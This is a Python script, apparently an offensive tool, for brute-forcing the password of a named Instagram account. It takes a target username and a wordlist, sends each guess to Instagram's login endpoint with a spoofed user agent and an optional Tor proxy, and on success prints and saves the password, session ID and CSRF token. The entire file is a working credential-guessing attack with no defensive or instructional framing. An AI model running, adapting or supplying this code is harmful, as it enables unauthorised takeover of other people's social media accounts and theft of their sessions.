#!/usr/bin/python3
import os
import sys
import time
import json
import requests
import threading
from datetime import datetime
from fake_user_agents import fake_agent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"

payload = {
    "queryParams" : {},
    "optIntoOneTap" : "false"
}

login_header = {
    "User-Agent" : fake_agent(),#"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "X-Requested-With" : "XMLHttpRequest",
    "Referer" : instagram_url
}
# adding local tor proxy "sudo systemctl enable tor"
proxy = {
    'http':  'socks5://localhost:9050',
    'https': 'socks5://localhost:9050',
}

cookie_request = requests.get(instagram_url)
csrf = cookie_request.cookies['csrftoken']
login_header.update({"x-csrftoken" : csrf})

target = input("target username: ")
payload.update({"username" : target})
#check_request = requests.get(f"https://www.instagram.com/{target}")#,proxies=proxy)
#if check_request.status_code != 200:
#    print(check_request.status_code)
#    print("target username not found")
#    exit()
#elif check_request.url == f"{instagram_url}?next=/{target}/":
#    #TOOD add proxy server 
#    print(check_request.url)
#    print("changing proxy server please wait")
#    #exit()

wordlist = input("wordlist path: ")
if wordlist == "generate":
    generate_words = ""
    with open(f'wordlists/{target}_generated_wordlists.txt', 'a') as generated_wordlist:
        while True:
            words = input("> ")
            if words == "":
                break
            else:
                generated_wordlist.write(words + "\n")
    
    with open(f'wordlists/{target}_generated_wordlists.txt', 'r') as generated_wordlist:
        for generated_word in generated_wordlist:
            generated_word = generated_word.strip()
            print(generated_word)
else:
    try:
        bruteforce = open(wordlist, "r")
    except FileNotFoundError:
        print("wordlist path noth found")
        exit()

save = input("save tryed passwords?: ")

def green(skk): 
    return "\033[92m {}\033[00m" .format(skk)

def attack_start_notify(target):
    os.system(f'herbe "Attack started to target: {target}"')
def attack_hack_notify(hack):
    os.system(f"herbe 'target password founded: {hack}'")

def main(proxy):
    tryes = 0
    threading.Thread(target=attack_start_notify, args=(target,)).start()
    for hack in bruteforce:
        tryes += 1
        hack = hack.strip()
        # TOOD add change proxy server after every 10 tryes
        payload.update({
            "enc_password" : f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
        })

        if proxy == "tor":
            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header, proxies=proxy)
        elif proxy == "default":
            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
        else:
            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)

        print(f"[-] trying password: {hack}")
        if save == "a":
            with open(f"tryed/{target}", "a") as tryed:
                tryed.write(hack)
        time.sleep(5)
        hack_data = json.loads(hack_request.text)
        print(f'[{green("INFO")}]: {hack_data}')
        if hack_data["authenticated"]:
            print(f"[+] password founded: {hack}")
            threading.Thread(target=attack_hack_notify, args=(hack,)).start()
            cookies = hack_request.cookies
            cookie_jar = cookies.get_dict()
            csrf_token = cookie_jar['csrftoken']
            print("csrf_token: ", csrf_token)
            session_id = cookie_jar['sessionid']
            print("session_id: ", session_id)
            with open(f"hacked/{target}", "a") as hacked:
                hacked.write(hack)
            break

if __name__ == "__main__":
    try:
        main(sys.argv[1])
    except IndexError:
        main("default")
